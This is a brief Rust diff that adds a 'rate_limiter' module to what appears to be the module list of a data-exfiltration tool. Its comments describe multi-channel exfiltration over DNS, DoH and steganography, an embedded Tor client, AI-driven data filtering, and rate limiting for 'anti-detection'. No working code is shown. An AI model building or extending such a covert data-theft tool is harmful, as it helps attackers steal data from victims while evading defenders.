@@ -23,6 +23,7 @@ pub mod ai_filtering; // AI-driven data filtering
 pub mod pqc; // Post-quantum cryptography (Kyber/Dilithium)
 pub mod multi_channel; // Multi-channel exfiltration (DNS, DoH, steganography)
 pub mod tor_client; // Embedded Tor client
+pub mod rate_limiter; // Rate limiting for exfiltration (anti-detection)
 
 // Re-export commonly used types
 pub use crypto::CryptoManager;
